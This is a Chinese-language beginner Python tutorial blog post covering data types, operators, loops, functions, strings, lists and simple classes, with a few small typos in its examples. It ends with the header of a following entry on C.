      <title>python</title>
      <link href="/2024/02/26/python/"/>
      <url>/2024/02/26/python/</url>
      
        <content type="html"><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="变量和类型"><a href="#变量和类型" class="headerlink" title="变量和类型"></a>变量和类型</h2><h3 id="常见的数据类型："><a href="#常见的数据类型：" class="headerlink" title="常见的数据类型："></a>常见的数据类型：</h3><p>整型：int类型支持二进制八进制十六进制的转换</p><p>浮点型：</p><p>字符串类型：以单引号和双信号引起来的任意文本，字符串还有原始字符串表示法，unicode表示法等。</p><p>布尔型;只有True False两种值(注意大小写)</p><p>复数型：这个不常用</p><h3 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h3><ul><li>硬性规则：<ul><li>变量名由字母（广义的Unicode字符，不包括特殊字符）、数字和下划线构成，数字不能开头。</li><li>大小写敏感（大写的<code>a</code>和小写的<code>A</code>是两个不同的变量）。</li><li>不要跟关键字（有特殊含义的单词，后面会讲到）和系统保留字（如函数、模块等的名字）冲突。</li></ul></li><li>PEP 8要求：<ul><li>用小写字母拼写，多个单词用下划线连接。</li><li>受保护的实例属性用单个下划线开头（后面会讲到）。</li><li>私有的实例属性用两个下划线开头（后面会讲到）。</li></ul></li></ul><p>数据类型的转换：</p><ul><li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li><li><code>float()</code>：将一个字符串转换成浮点数。</li><li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li><li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li><li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。</li></ul><p>运算符：</p><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td><code>[]</code> <code>[:]</code></td><td>下标，切片</td></tr><tr><td><code>**</code></td><td>指数</td></tr><tr><td><code>~</code> <code>+</code> <code>-</code></td><td>按位取反, 正负号</td></tr><tr><td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td><td>乘，除，模，整除</td></tr><tr><td><code>+</code> <code>-</code></td><td>加，减</td></tr><tr><td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td><td>右移，左移</td></tr><tr><td><code>&amp;</code></td><td>按位与</td></tr><tr><td><code>^</code> <code>|</code></td><td>按位异或，按位或</td></tr><tr><td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td><td>小于等于，小于，大于，大于等于</td></tr><tr><td><code>==</code> <code>!=</code></td><td>等于，不等于</td></tr><tr><td><code>is</code>  <code>is not</code></td><td>身份运算符</td></tr><tr><td><code>in</code> <code>not in</code></td><td>成员运算符</td></tr><tr><td><code>not</code> <code>or</code> <code>and</code></td><td>逻辑运算符</td></tr><tr><td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> &#96;</td><td>&#x3D;<code> </code>^&#x3D;<code> </code>&gt;&gt;&#x3D;<code> </code>&lt;&lt;&#x3D;&#96;</td></tr></tbody></table><h2 id="python的分支结构"><a href="#python的分支结构" class="headerlink" title="python的分支结构"></a>python的分支结构</h2><p>python中代码的结构层次采用缩进的方式来表示，if如果要执行多条语句，只需要保持多条语句有相同的缩进即可，通常使用四个空格。</p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&#x27;x = &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">1</span>:</span><br><span class="line">    y = <span class="number">3</span> * x - <span class="number">5</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> x &gt;= -<span class="number">1</span>:</span><br><span class="line">        y = x + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        y = <span class="number">5</span> * x + <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;f(%.2f) = %.2f&#x27;</span> % (x, y))</span><br></pre></td></tr></table></figure><h3 id="for-in循环"><a href="#for-in循环" class="headerlink" title="for-in循环"></a>for-in循环</h3><p>如果明确知道循环的执行次数，或者要对一个容器进行迭代建议使用for-in循环。例如：计算1~100求和的结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>需要说明的是上面代码中的<code>range(1, 101)</code>可以用来构造一个从1到100的范围，当我们把这样一个范围放到<code>for-in</code>循环中，就可以通过前面的循环变量<code>x</code>依次取出从1到100的整数。当然，<code>range</code>的用法非常灵活，下面给出了一个例子：</p><ul><li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li><li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li><li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li><li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="whlie循环"><a href="#whlie循环" class="headerlink" title="whlie循环"></a>whlie循环</h3><p>如果要构造不知道具体循环次数的循环结构，我们推荐使用<code>while</code>循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。</p><p>例如下面的猜数字小游戏</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">answer = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;小一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;你总共猜了%d次&#x27;</span> % counter)</span><br><span class="line"><span class="keyword">if</span> counter &gt; <span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你的智商余额明显不足&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="python函数的应用"><a href="#python函数的应用" class="headerlink" title="python函数的应用"></a>python函数的应用</h1><p>定义函数：在Python中可以使用<code>def</code>关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过<code>return</code>关键字来返回一个值，这相当于数学上说的函数的因变量。</p><p>阶乘函数:自定义，其中在math库中factorial为阶乘函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fac</span>(<span class="params">num</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        result *= n</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>Python中，函数的参数可以有默认值，也支持使用可变参数，所以Python并不需要像其他语言一样支持<a href="https://zh.wikipedia.org/wiki/%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD">函数的重载</a>，因为我们在定义一个函数的时候可以让它有多种不同的使用方式。</p><p>引用函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module1 <span class="keyword">as</span> m1</span><br><span class="line"><span class="keyword">import</span> module2 <span class="keyword">as</span> m2</span><br><span class="line"></span><br><span class="line">m1.foo()</span><br><span class="line">m2.foo()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> module1 <span class="keyword">import</span> foo</span><br><span class="line"><span class="keyword">from</span> module2 <span class="keyword">import</span> foo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出goodbye, world!</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>如果写成上面这个样子，那么输出的即为最后一个foo,会将前面的覆盖。</p><h2 id="字符串和常用数据结构"><a href="#字符串和常用数据结构" class="headerlink" title="字符串和常用数据结构"></a>字符串和常用数据结构</h2><p>所谓<strong>字符串</strong>，就是由零个或多个字符组成的有限序列，，如果我们把单个或多个字符用单引号或者双引号包围起来，就可以表示一个字符串。</p><p>可以在字符串中使用<code>\</code>（反斜杠）来表示转义，也就是说<code>\</code>后面的字符不再是它原来的意义，例如：<code>\n</code>不是代表反斜杠和字符n，而是表示换行；而<code>\t</code>也不是代表反斜杠和字符t，而是表示制表符。所以如果想在字符串中表示<code>&#39;</code>要写成<code>\&#39;</code>，同理想表示<code>\</code>要写成<code>\\</code>。可以运行下面的代码看看会输出什么。</p><p>如果不希望字符串中的<code>\</code>表示转义，我们可以通过在字符串的最前面加上字母<code>r</code>来加以说明。</p><p>Python为字符串类型提供了非常丰富的运算符，我们可以使用<code>+</code>运算符来实现字符串的拼接，可以使用<code>*</code>运算符来重复一个字符串的内容，可以使用<code>in</code>和<code>not in</code>来判断一个字符串是否包含另外一个字符串（成员运算），我们也可以用<code>[]</code>和<code>[:]</code>运算符从字符串取出某个字符或某些字符（切片运算）。例如下面：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello &#x27;</span> * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># hello hello hello </span></span><br><span class="line">s2 = <span class="string">&#x27;world&#x27;</span></span><br><span class="line">s1 += s2</span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># hello hello hello world</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ll&#x27;</span> <span class="keyword">in</span> s1) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span> <span class="keyword">in</span> s1) <span class="comment"># False</span></span><br><span class="line">str2 = <span class="string">&#x27;abc123456&#x27;</span></span><br><span class="line"><span class="comment"># 从字符串中取出指定位置的字符(下标运算)</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>]) <span class="comment"># c</span></span><br><span class="line"><span class="comment"># 字符串切片(从指定的开始索引到指定的结束索引)</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>:<span class="number">5</span>]) <span class="comment"># c12</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>:]) <span class="comment"># c123456</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>::<span class="number">2</span>]) <span class="comment"># c246</span></span><br><span class="line"><span class="built_in">print</span>(str2[::<span class="number">2</span>]) <span class="comment"># ac246</span></span><br><span class="line"><span class="built_in">print</span>(str2[::-<span class="number">1</span>]) <span class="comment"># 654321cba</span></span><br><span class="line"><span class="built_in">print</span>(str2[-<span class="number">3</span>:-<span class="number">1</span>]) <span class="comment"># 45</span></span><br></pre></td></tr></table></figure><p>对字符串的处理：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line"><span class="comment"># 通过内置函数len计算字符串的长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(str1)) <span class="comment"># 13</span></span><br><span class="line"><span class="comment"># 获得字符串首字母大写的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.capitalize()) <span class="comment"># Hello, world!</span></span><br><span class="line"><span class="comment"># 获得字符串每个单词首字母大写的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.title()) <span class="comment"># Hello, World!</span></span><br><span class="line"><span class="comment"># 获得字符串变大写后的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.upper()) <span class="comment"># HELLO, WORLD!</span></span><br><span class="line"><span class="comment"># 从字符串中查找子串所在位置</span></span><br><span class="line"><span class="built_in">print</span>(str1.find(<span class="string">&#x27;or&#x27;</span>)) <span class="comment"># 8</span></span><br><span class="line"><span class="built_in">print</span>(str1.find(<span class="string">&#x27;shit&#x27;</span>)) <span class="comment"># -1</span></span><br><span class="line"><span class="comment"># 与find类似但找不到子串时会引发异常</span></span><br><span class="line"><span class="comment"># print(str1.index(&#x27;or&#x27;))</span></span><br><span class="line"><span class="comment"># print(str1.index(&#x27;shit&#x27;))</span></span><br><span class="line"><span class="comment"># 检查字符串是否以指定的字符串开头</span></span><br><span class="line"><span class="built_in">print</span>(str1.startswith(<span class="string">&#x27;He&#x27;</span>)) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(str1.startswith(<span class="string">&#x27;hel&#x27;</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 检查字符串是否以指定的字符串结尾</span></span><br><span class="line"><span class="built_in">print</span>(str1.endswith(<span class="string">&#x27;!&#x27;</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 将字符串以指定的宽度居中并在两侧填充指定的字符</span></span><br><span class="line"><span class="built_in">print</span>(str1.center(<span class="number">50</span>, <span class="string">&#x27;*&#x27;</span>))</span><br><span class="line"><span class="comment"># 将字符串以指定的宽度靠右放置左侧填充指定的字符</span></span><br><span class="line"><span class="built_in">print</span>(str1.rjust(<span class="number">50</span>, <span class="string">&#x27; &#x27;</span>))</span><br><span class="line">str2 = <span class="string">&#x27;abc123456&#x27;</span></span><br><span class="line"><span class="comment"># 检查字符串是否由数字构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isdigit())  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 检查字符串是否以字母构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isalpha())  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 检查字符串是否以数字和字母构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isalnum())  <span class="comment"># True</span></span><br><span class="line">str3 = <span class="string">&#x27;  jackfrued@126.com &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(str3)</span><br><span class="line"><span class="comment"># 获得字符串修剪左右两侧空格之后的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str3.strip())</span><br></pre></td></tr></table></figure><p>a*b&#x3D;多少的简洁写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = <span class="number">5</span>, <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span> * <span class="subst">&#123;b&#125;</span> = <span class="subst">&#123;a * b&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接下来我们要介绍的列表（<code>list</code>），也是一种结构化的、非标量类型，它是值的有序序列，每个值都可以通过索引进行标识，定义列表可以将列表的元素放在<code>[]</code>中，多个元素用<code>,</code>进行分隔，可以使用<code>for</code>循环对列表元素进行遍历，也可以使用<code>[]</code>或<code>[:]</code>运算符取出列表中的一个或多个元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 3, 5, 7, 100]</span></span><br><span class="line"><span class="comment"># 乘号表示列表元素的重复</span></span><br><span class="line">list2 = [<span class="string">&#x27;hello&#x27;</span>] * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(list2) <span class="comment"># [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"><span class="comment"># 计算列表长度(元素个数)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1)) <span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 下标(索引)运算</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>]) <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">4</span>]) <span class="comment"># 100</span></span><br><span class="line"><span class="comment"># print(list1[5])  # IndexError: list index out of range</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>]) <span class="comment"># 100</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">3</span>]) <span class="comment"># 5</span></span><br><span class="line">list1[<span class="number">2</span>] = <span class="number">300</span></span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 3, 300, 7, 100]</span></span><br><span class="line"><span class="comment"># 通过循环用下标遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1)):</span><br><span class="line">    <span class="built_in">print</span>(list1[index])</span><br><span class="line"><span class="comment"># 通过for循环遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(elem)</span><br><span class="line"><span class="comment"># 通过enumerate函数处理列表之后再遍历可以同时获得元素索引和值</span></span><br><span class="line"><span class="keyword">for</span> index, elem <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1):</span><br><span class="line">    <span class="built_in">print</span>(index, elem)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line"><span class="comment"># 添加元素</span></span><br><span class="line">list1.append(<span class="number">200</span>)</span><br><span class="line">list1.insert(<span class="number">1</span>, <span class="number">400</span>)</span><br><span class="line"><span class="comment"># 合并两个列表</span></span><br><span class="line"><span class="comment"># list1.extend([1000, 2000])</span></span><br><span class="line">list1 += [<span class="number">1000</span>, <span class="number">2000</span>]</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 400, 3, 5, 7, 100, 200, 1000, 2000]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1)) <span class="comment"># 9</span></span><br><span class="line"><span class="comment"># 先通过成员运算判断元素是否在列表中，如果存在就删除该元素</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">3</span> <span class="keyword">in</span> list1:</span><br><span class="line">list1.remove(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1234</span> <span class="keyword">in</span> list1:</span><br><span class="line">    list1.remove(<span class="number">1234</span>)</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 400, 5, 7, 100, 200, 1000, 2000]</span></span><br><span class="line"><span class="comment"># 从指定的位置删除元素</span></span><br><span class="line">list1.pop(<span class="number">0</span>)</span><br><span class="line">list1.pop(<span class="built_in">len</span>(list1) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [400, 5, 7, 100, 200, 1000]</span></span><br><span class="line"><span class="comment"># 清空列表元素</span></span><br><span class="line">list1.clear()</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># []</span></span><br></pre></td></tr></table></figure><h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><p>class定义类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># __init__是一个特殊方法用于在创建对象时进行初始化操作</span></span><br><span class="line">    <span class="comment"># 通过这个方法我们可以为学生对象绑定name和age两个属性</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">study</span>(<span class="params">self, course_name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s正在学习%s.&#x27;</span> % (self.name, course_name))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PEP 8要求标识符的名字用全小写多个单词用下划线连接</span></span><br><span class="line">    <span class="comment"># 但是部分程序员和公司更倾向于使用驼峰命名法(驼峰标识)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">watch_movie</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.age &lt; <span class="number">18</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;%s只能观看《熊出没》.&#x27;</span> % self.name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;%s正在观看岛国爱情大电影.&#x27;</span> % self.name)</span><br></pre></td></tr></table></figure><h3 id="创建和使用对象"><a href="#创建和使用对象" class="headerlink" title="创建和使用对象"></a>创建和使用对象</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 创建学生对象并指定姓名和年龄</span></span><br><span class="line">    stu1 = Student(<span class="string">&#x27;骆昊&#x27;</span>, <span class="number">38</span>)</span><br><span class="line">    <span class="comment"># 给对象发study消息</span></span><br><span class="line">    stu1.study(<span class="string">&#x27;Python程序设计&#x27;</span>)</span><br><span class="line">    <span class="comment"># 给对象发watch_av消息</span></span><br><span class="line">    stu1.watch_movie()</span><br><span class="line">    stu2 = Student(<span class="string">&#x27;王大锤&#x27;</span>, <span class="number">15</span>)</span><br><span class="line">    stu2.study(<span class="string">&#x27;思想品德&#x27;</span>)</span><br><span class="line">    stu2.watch_movie()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>练习：</p><p>1.定义一个类似描述数字的时钟</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;数字时钟&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, hour=<span class="number">0</span>, minute=<span class="number">0</span>, second=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param hour: 时</span></span><br><span class="line"><span class="string">        :param minute: 分</span></span><br><span class="line"><span class="string">        :param second: 秒</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self._hour = hour</span><br><span class="line">        self._minute = minute</span><br><span class="line">        self._second = second</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;走字&quot;&quot;&quot;</span></span><br><span class="line">        self._second += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self._second == <span class="number">60</span>:</span><br><span class="line">            self._second = <span class="number">0</span></span><br><span class="line">            self._minute += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self._minute == <span class="number">60</span>:</span><br><span class="line">                self._minute = <span class="number">0</span></span><br><span class="line">                self._hour += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self._hour == <span class="number">24</span>:</span><br><span class="line">                    self._hour = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示时间&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%02d:%02d:%02d&#x27;</span> % \</span><br><span class="line">               (self._hour, self._minute, self._second)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    clock = Clock(<span class="number">23</span>, <span class="number">59</span>, <span class="number">58</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(clock.show())</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        clock.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x=<span class="number">0</span>, y=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化方法</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param x: 横坐标</span></span><br><span class="line"><span class="string">        :param y: 纵坐标</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move_to</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;移动到指定位置</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param x: 新的横坐标</span></span><br><span class="line"><span class="string">        &quot;param y: 新的纵坐标</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move_by</span>(<span class="params">self, dx, dy</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;移动指定的增量</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param dx: 横坐标的增量</span></span><br><span class="line"><span class="string">        &quot;param dy: 纵坐标的增量</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.x += dx</span><br><span class="line">        self.y += dy</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance_to</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;计算与另一个点的距离</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param other: 另一个点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        dx = self.x - other.x</span><br><span class="line">        dy = self.y - other.y</span><br><span class="line">        <span class="keyword">return</span> sqrt(dx ** <span class="number">2</span> + dy ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(%s, %s)&#x27;</span> % (<span class="built_in">str</span>(self.x), <span class="built_in">str</span>(self.y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p1 = Point(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">    p2 = Point()</span><br><span class="line">    <span class="built_in">print</span>(p1)</span><br><span class="line">    <span class="built_in">print</span>(p2)</span><br><span class="line">    p2.move_by(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(p2)</span><br><span class="line">    <span class="built_in">print</span>(p1.distance_to(p2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C</title>
      <link href="/2023/12/25/c/"/>
      <url>/2023/12/25/c/</url>
      
